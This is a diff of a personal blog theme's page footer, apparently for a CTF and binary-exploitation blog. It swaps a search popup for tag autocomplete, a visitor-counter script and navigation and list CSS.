-      <div id="algolia-hits"></div>
-      <div id="algolia-pagination" class="algolia-pagination"></div>
-    </div>
-    <span class="popup-btn-close">
-      <i class="fa fa-times-circle"></i>
-    </span>
-  </div>
-</div>
-
-
+<script src="/js/script.js?v=1.0.1" ></script>
 <script>
-$(document).ready(function(){
-window.scrollReveal = new scrollReveal({ reset: true});
-//
-})
+    var img_resize = 'default';
+    /*作者、标签的自动补全*/
+    $(function () {
+        $('.search').AutoComplete({
+            'data': ['#pwnable','#ctf','#2019','#kernel','#tw','#pwntools','#glibc',],
+            'itemHeight': 20,
+            'width': 418
+        }).AutoComplete('show');
+    })
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $(".post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+
+        /*高亮代码块行号*/
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+
 </script>
+
+<!--加入行号的高亮代码块样式-->
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+        .nav .hide-list.fullscreen {
+            left: 492px
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+    .post .pjax article .article-entry>ol, .post .pjax article .article-entry>ul, .post .pjax article>ol, .post .pjax article>ul{
+        border: #e2dede solid 1px;
+        border-radius: 10px;
+        padding: 10px 32px 10px 56px;
+    }
+    .post .pjax article .article-entry li>ol, .post .pjax article .article-entry li>ul,.post .pjax article li>ol, .post .pjax article li>ul{
+        padding-top: 5px;
+        padding-bottom: 5px;
+    }
+    .post .pjax article .article-entry>ol>li, .post .pjax article .article-entry>ul>li,.post .pjax article>ol>li, .post .pjax article>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    .post .pjax article .article-entry li>ol>li, .post .pjax article .article-entry li>ul>li,.post .pjax article li>ol>li, .post .pjax article li>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+    .nav-right:before {
+        content: ' ';
+        display: block;
+        position: absolute;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 0.3;
+        background: url("");
+        background-repeat: no-repeat;
+        background-position: 50% 0;
+        -ms-background-size: cover;
+        -o-background-size: cover;
+        -moz-background-size: cover;
+        -webkit-background-size: cover;
+        background-size: cover;
+    }
+    
+
+    
+</style>
+
+
+
+
+
+
+
+</html>
